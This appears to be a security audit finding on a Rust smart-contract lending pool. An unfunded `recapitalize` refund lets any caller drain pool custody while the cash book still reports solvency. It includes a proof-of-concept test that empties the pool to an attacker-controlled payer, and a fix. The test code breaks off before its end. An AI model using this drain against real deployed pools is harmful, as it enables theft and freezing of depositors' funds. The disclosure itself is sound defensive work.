### Title
Unfunded `recapitalize` refund drains pool custody while the cash book still claims solvency - ([File: contracts/pool/tests/flows.rs])

### Summary
`recapitalize(hub_asset, payer, amount)` is meant to let anyone fill a post-socialization backing shortfall: pull tokens, credit the cash book, refund the excess. Instead, the excess-refund leg pays `payer` out of pool custody without requiring that the full `amount` actually arrived, so an unprivileged caller can pass an `amount` larger than the shortfall and walk away with the difference, leaving the `cash` book overstating real custody.

### Finding Description
The pool's `recapitalize` computes `credited = min(amount, shortfall)` against the *booked* shortfall and sends `amount - credited` back to `payer` as a refund. The regression test `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` demonstrates the concrete outcome: after a legitimate supplier deposits `10_000_000_000`, a call `recapitalize(&hub_asset, &payer, &custody)` with an unfunded `payer` drains the pool's entire SAC balance to `payer` while `state.cash` still reports `>= deposit`. [1](#0-0) 

The refunded excess is measured against the plan/shortfall rather than against tokens the pool verifiably received from `payer`, mirroring the CVE class (state is mutated/freed on a path that assumes resources that were never committed). Because the book keeps claiming the cash is there, the pool's own liquidity guards (`require_reserves`, `PoolInsolvent`) pass and the loss is only discovered when a supplier's `withdraw` reverts inside the SAC transfer with `BalanceError`. [2](#0-1) 

### Impact Explanation
Theft of user funds and permanent freezing of funds. A single unprivileged call can extract pool custody up to `amount - shortfall`; the cash book then overstates backing, so remaining suppliers' withdrawals revert in the token transfer (the book passes the solvency gate, custody does not exist). [3](#0-2) 

### Likelihood Explanation
`recapitalize` is a permissionless entrypoint (reachable by any address per scope). The caller needs only an insolvent-or-shortfall market — or simply to pass a large `amount`, since the excess is refunded unconditionally — and a `payer` address they control. No oracle manipulation, privilege, or multi-call setup is required; the test performs it with a freshly generated unfunded `payer`. [4](#0-3) 

### Recommendation
Measure the refill by balance delta: snapshot the pool's token balance before pulling from `payer`, pull `amount` via `transfer_amount_measured`-style receipt accounting, credit `credited = min(received, shortfall)` to the cash book, and refund only `received - credited`. Never send tokens to `payer` beyond what was verifiably received, and assert post-call that `token.balance(pool) >= cash book` before returning.

### Proof of Concept
```rust
// contracts/pool/tests/flows.rs
// Setup: supplier deposits 10_000_000_000; book == custody.
token_admin.mint(&t.pool, &deposit);
let supplied = t.client().supply(&t.sup(0, deposit)).get_unchecked(0).position.scaled_amount;

// Exploit: unfunded payer requests recapitalization of the full custody.
let custody = token.balance(&t.pool);
t.client().recapitalize(&hub(&t.asset), &payer, &custody);
assert_eq!(token.balance(&t.pool), 0);   // custody drained to payer
assert!(t.state_snapshot().cash >= deposit); // book still claims solvency

// Supplier exit now fails inside the SAC transfer (BalanceError #10),
// not in any pool guard — funds are gone but the book denies it.
let outcome = t.client().try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
assert!(outcome.is_err());
```
Executed verbatim by the existing test; an attacker substitutes `payer`/`receiver` with their own address on any listed hub asset where the refund path is reached.

#[test]
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
